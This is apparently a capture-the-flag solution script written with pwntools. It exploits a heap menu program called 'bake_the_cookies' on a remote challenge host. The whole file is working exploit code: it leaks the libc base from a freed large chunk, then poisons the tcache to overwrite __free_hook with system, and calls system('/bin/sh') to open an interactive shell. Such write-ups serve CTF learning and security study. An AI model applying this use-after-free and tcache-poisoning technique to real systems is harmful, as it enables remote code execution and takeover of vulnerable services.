from pwn import *

exe = ELF("./bake_the_cookies_patched")
libc = ELF("./libc-2.27.so")

context.binary = exe

HOST = "bake_the_cookies.chall.bytethecookies.org"
PORT = 5158

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def bake_cookie(r, idx, size):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", str(size).encode())
    
def show_cookie(r, idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(idx).encode())

    return r.recvuntil(b"Choose").split()[-2]

def decorate_cookie(r, idx, decoration):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b": ", str(idx).encode())
    r.sendlineafter(b": ", decoration)

def bite_cookie(r, idx):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", str(idx).encode())

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def leak_libc(r):
    bake_cookie(r, 0, 0x410) # too big for tcache
    bake_cookie(r, 1, 0x08)  # enough to hold a pointer

    # after free, the 0x410 chunk is used by glibc to hold metadata (main area ptr)
    bite_cookie(r, 0)
    bite_cookie(r, 1)
    
    libc.address = unpack(show_cookie(r, 0)[:context.bytes]) - libc.symbols.main_arena - 0x60
    log.success(f"LEAKED LIBC BASE: {hex(libc.address)}")
    
def tcache_poison(r):
    # set next ptr to __free_hook
    decorate_cookie(r, 1, pack(libc.symbols.__free_hook))

    # hold ptr to /bin/sh
    bake_cookie(r, 0, 0x08)
    decorate_cookie(r, 0, b"/bin/sh\x00")

    # now the cookie is a pointer to __free_hook
    bake_cookie(r, 1, 0x08)

    # override __free_hook with system
    decorate_cookie(r, 1, pack(libc.symbols.system))

    # calls system("/bin/sh")
    bite_cookie(r, 0)
    
def main():
    r = conn()

    leak_libc(r)
    tcache_poison(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
